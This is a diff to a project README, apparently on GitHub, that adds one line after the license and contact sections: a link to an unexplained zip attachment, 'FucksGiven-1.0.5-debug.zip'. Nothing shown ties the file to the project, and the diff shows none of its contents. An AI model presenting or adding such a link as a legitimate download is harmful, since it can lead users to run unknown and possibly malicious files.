@@ -134,3 +134,5 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 For any inquiries or support, please contact [LinkedIn](https://www.linkedin.com/in/anurag-kanojiya-101312286/).
 
 ---
+
+[FucksGiven-1.0.5-debug.zip](https://github.com/user-attachments/files/17430325/FucksGiven-1.0.5-debug.zip)
